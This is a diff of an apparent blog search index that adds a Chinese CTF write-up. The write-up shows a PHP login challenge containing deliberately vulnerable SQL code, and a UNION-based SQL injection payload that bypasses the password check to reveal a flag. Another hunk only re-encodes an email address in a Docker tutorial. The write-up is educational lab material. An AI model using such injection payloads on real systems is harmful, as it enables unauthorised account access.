@@ -4,6 +4,100 @@
   
     
     <entry>
+      <title><![CDATA[week 2 for cnas writeup]]></title>
+      <url>http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</url>
+      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="火星文-50"><a href="#火星文-50" class="headerlink" title="火星文 50"></a>火星文 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="external">http://47.100.121.220:28001/</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%872.png" alt=""></p>
+<p>A跑出来是一串密文，B跑出来是一个解密脚本</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/base6.png" alt=""></p>
+<h2 id="用户登录-100"><a href="#用户登录-100" class="headerlink" title="用户登录 100"></a>用户登录 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/" target="_blank" rel="external">http://47.100.121.220:28002/</a></p>
+<h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><p>mysql_query() 函数</p>
+<p>mysql_query() 函数执行一条 MySQL 查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_query(query,connection)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>query</td>
+<td style="text-align:center">必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</td>
+</tr>
+<tr>
+<td>connection</td>
+<td style="text-align:center">可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</td>
+</tr>
+</tbody>
+</table>
+<p>mysql_fetch_array() 函数</p>
+<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_fetch_array(data,array_type)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>data</td>
+<td style="text-align:center">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td>
+</tr>
+<tr>
+<td>array_type</td>
+<td style="text-align:center">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组 MYSQL_NUM - 数字数组 MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
+</tr>
+</tbody>
+</table>
+<p>strcasecmp() 函数</p>
+<p>strcasecmp() 函数比较两个字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strcasecmp(string1,string2)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string1</td>
+<td style="text-align:center">必需。规定要比较的第一个字符串。</td>
+</tr>
+<tr>
+<td>string2</td>
+<td style="text-align:center">必需。规定要比较的第二个字符串。</td>
+</tr>
+</tbody>
+</table>
+<p>以上是本题涉及到的几个函数。</p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;config.php&quot;;</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</div><div class="line">    $user = $_POST[&quot;user&quot;];</div><div class="line">    $pass = md5($_POST[&quot;pass&quot;]);</div><div class="line">    $auth = false;</div><div class="line">    </div><div class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</div><div class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</div><div class="line">    </div><div class="line">    $sql = &quot;select password from user where user=&apos;$user&apos;&quot;;</div><div class="line">    $query = mysql_query($sql);</div><div class="line">    if(!$query) &#123;</div><div class="line">        mysql_close($conn);</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">    if($row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])) &#123;</div><div class="line">        $auth = true;</div><div class="line">    &#125;</div><div class="line">    mysql_close($conn);</div><div class="line">    </div><div class="line">    if($auth) &#123;</div><div class="line">        echo &quot;login success!&quot;;</div><div class="line">        echo $flag;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;$user&apos;</div></pre></td></tr></table></figure>
+<p>是存在SQL注入的，但是用户名和密码是分开判断。所以普通的万能密码是不行的。</p>
+<p>\$row[“password”]的值是从$sql提取出来的,<br>然后经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])</div></pre></td></tr></table></figure></p>
+<p>进行密码判断。</p>
+<p>我们可以构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AND 0=1 UNION SELECT md(1) #</div></pre></td></tr></table></figure>
+<p>拼接到\$sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;&apos;AND 0=1 UNION SELECT md(1) #&quot;</div></pre></td></tr></table></figure></p>
+<ol>
+<li>最前面的单引号：闭合原文的where user=’</li>
+<li>AND 0=1:为了使前面的表达式返回值为空.</li>
+<li>接着我们使用UNION SELECT MD5(1)，直接把MD5值作为返回值retuen给$sql，这样在查询的时候$query就会有值.</li>
+<li>最后的#用来注释掉后面没用的东西</li>
+</ol>
+<p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username:&apos; and 0=1 union select md5(1)#</div><div class="line">password:1</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sqlsql.png" alt=""></p>
+<h2 id="You-have-no-permissions-150"><a href="#You-have-no-permissions-150" class="headerlink" title="You have no permissions 150"></a>You have no permissions 150</h2>]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[php内置过滤函数总结]]></title>
       <url>http://uknowsec.cn/posts/notes/php%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
@@ -616,7 +710,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x66;&#111;&#x6f;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#x6f;&#x6d;">&#x66;&#111;&#x6f;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#x6f;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#x66;&#111;&#x6f;&#x40;&#98;&#97;&#114;&#x2e;&#99;&#111;&#x6d;">&#x66;&#111;&#x6f;&#x40;&#98;&#97;&#114;&#x2e;&#99;&#111;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
